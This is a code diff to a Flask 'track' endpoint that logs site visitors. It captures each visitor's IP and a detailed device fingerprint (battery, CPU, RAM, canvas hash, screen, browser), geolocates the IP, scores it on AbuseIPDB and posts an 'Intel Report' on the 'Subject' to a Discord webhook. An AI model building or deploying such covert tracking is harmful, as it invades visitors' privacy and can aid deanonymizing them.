@@ -24,7 +24,7 @@ def track():
     if not DISCORD_WEBHOOK_URL:
         return "Error: Discord Webhook URL not configured.", 500
 
-    # --- Step 1: Capture All Data ---
+    # --- Step 1: Data Capture ---
     raw_ip_list = request.headers.get('X-Forwarded-For', request.remote_addr)
     ip_address = raw_ip_list.split(',')[0].strip()
     # (Baaki saara data capture karna waisa hi hai)
@@ -36,58 +36,67 @@ def track():
     is_touch = 'Yes' if is_touch == 'true' else 'No'
     ad_blocker_status = 'Detected 🛡️' if ad_blocker == 'true' else 'Not Detected 🟢'
     
-    # --- Step 2: Deep IP Intelligence & Threat Assessment ---
-    geo_info, asn_info, hostname, threat_level, risk_color = "Not available", "Not available", "Not available", "Low ✅", 3066993 # Default to Green
+    # --- Step 2: Deep IP Intelligence with NEW Geolocation Provider ---
+    geo_info, asn_info, hostname, threat_level, risk_color = "Lookup Failed", "Lookup Failed", "Lookup Failed", "Low ✅", 3066993 # Default to Green
     abuse_score = 0
     
-    try: # Geolocation, ASN, Hostname
-        response_ipinfo = requests.get(f"https://ipinfo.io/{ip_address}/json")
-        if response_ipinfo.status_code == 200:
-            data = response_ipinfo.json()
-            city, country_code, isp, asn = data.get('city', 'N/A'), data.get('country', 'N/A'), data.get('org', 'N/A'), data.get('asn', {})
-            flag_emoji = "".join(chr(ord(c.upper()) + 127397) for c in country_code) if country_code and country_code != 'N/A' else ""
-            geo_info = f"{flag_emoji} {city}, {country_code}"
-            asn_info = f"{asn.get('name', '')}"
-            if any(word in asn_info.lower() for word in ['vpn', 'proxy', 'hosting']):
-                threat_level = "High 🟥 (VPN/Proxy Host)"
-                risk_color = 15158332 # Red
-        hostname = socket.gethostbyaddr(ip_address)[0]
-    except Exception: pass
+    # Geolocation, ASN using ip-api.com
+    try:
+        # NEW: Using ip-api.com
+        response_geo = requests.get(f"http://ip-api.com/json/{ip_address}?fields=status,message,country,countryCode,city,isp,as,query", timeout=5)
+        if response_geo.status_code == 200:
+            data = response_geo.json()
+            if data.get('status') == 'success':
+                city, country_code, isp, asn_str = data.get('city', 'N/A'), data.get('countryCode', 'N/A'), data.get('isp', 'N/A'), data.get('as', 'N/A')
+                flag_emoji = "".join(chr(ord(c.upper()) + 127397) for c in country_code) if country_code and country_code != 'N/A' else ""
+                geo_info = f"{flag_emoji} {city}, {country_code}"
+                asn_info = f"{isp}\n({asn_str})"
+                if any(word in asn_info.lower() for word in ['vpn', 'proxy', 'hosting', 'datacenter']):
+                    threat_level = "Medium 🟨 (VPN/Proxy Host)"
+                    risk_color = 15844367 # Yellow
+    except requests.exceptions.Timeout:
+        print(f"ERROR: ip-api.com request timed out for IP {ip_address}")
+        geo_info = "Timeout"
+    except Exception as e:
+        print(f"ERROR: ip-api.com lookup failed for IP {ip_address}: {e}")
 
-    if ABUSEIPDB_KEY: # IP Reputation
+    # Hostname
+    try:
+        hostname = socket.gethostbyaddr(ip_address)[0]
+    except Exception:
+        hostname = "Not Found"
+
+    # IP Reputation (AbuseIPDB)
+    if ABUSEIPDB_KEY:
         try:
-            response_abuse = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip_address}", headers={'Key': ABUSEIPDB_KEY, 'Accept': 'application/json'})
+            response_abuse = requests.get(f"https://api.abuseipdb.com/api/v2/check?ipAddress={ip_address}", headers={'Key': ABUSEIPDB_KEY, 'Accept': 'application/json'}, timeout=5)
             if response_abuse.status_code == 200:
                 data = response_abuse.json()['data']
                 abuse_score = data.get('abuseConfidenceScore', 0)
                 if data.get('isTor'): threat_level, risk_color = "Critical 🚨 (Tor Exit Node)", 15158332
                 elif abuse_score > 75: threat_level, risk_color = f"High 🟥 ({abuse_score}% Abuse Score)", 15158332
-                elif abuse_score > 25: threat_level, risk_color = f"Medium 🟨 ({abuse_score}% Abuse Score)", 15844367 # Yellow
-        except Exception: pass
-    
+                elif abuse_score > 25 and risk_color != 15158332: threat_level, risk_color = f"Medium 🟨 ({abuse_score}% Abuse Score)", 15844367
+        except Exception as e:
+            print(f"ERROR: AbuseIPDB lookup failed: {e}")
+    else:
+        abuse_score = "API Key Missing"
+
     # --- Step 3: THE "INTELLIGENCE BRIEFING" EMBED ---
     embed = {
         "author": { "name": f"Holland Intel Report: {visitor_type} Visitor", "icon_url": "https://i.imgur.com/M6yB8oA.png" },
         "description": f"**Subject:** `{username}`\n"
                        f"**IP Address:** `{ip_address}`\n"
                        f"**Threat Assessment:** **{threat_level}**",
-        "color": risk_color,
-        "thumbnail": { "url": avatar_url },
+        "color": risk_color, "thumbnail": { "url": avatar_url },
         "fields": [
             { "name": "📍 Location", "value": f"`{geo_info}`", "inline": True },
             { "name": "🏢 Network Operator", "value": f"`{asn_info}`", "inline": True },
-            { "name": "🌐 Hostname", "value": f"`{hostname}`", "inline": False },
-            { "name": "💻 Client Profile", 
-              "value": f"**OS:** `{os_type}`\n"
-                       f"**Browser:** `{browser}`\n"
-                       f"**Screen:** `{screen_res}`", "inline": True },
-            { "name": "⚙️ Hardware & Network", 
-              "value": f"**CPU/RAM:** `{cpu_cores}c` / `{ram}GB`\n"
-                       f"**Speed:** `{network_speed} Mbps`\n"
-                       f"**Battery:** `{battery_level}` (`{is_charging}`)", "inline": True },
+            { "name": "🛡️ Abuse Score", "value": f"`{abuse_score}%`", "inline": True },
+            { "name": "💻 Client Profile", "value": f"**OS:** `{os_type}`\n**Browser:** `{browser}`\n**Screen:** `{screen_res}`", "inline": True },
+            { "name": "⚙️ Hardware & Network", "value": f"**CPU/RAM:** `{cpu_cores}c` / `{ram}GB`\n**Speed:** `{network_speed} Mbps`\n**Battery:** `{battery_level}` (`{is_charging}`)", "inline": True },
             { "name": "💬 User Message", "value": f"> {user_message}" if user_message != 'N/A' else "> No message left.", "inline": False },
         ],
-        "footer": { "text": f"Canvas: {canvas_hash} | AdBlocker: {ad_blocker_status} | Langs: {languages} | Logged: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC" }
+        "footer": { "text": f"Canvas: {canvas_hash} | Hostname: {hostname} | Logged: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC" }
     }
 
     try:
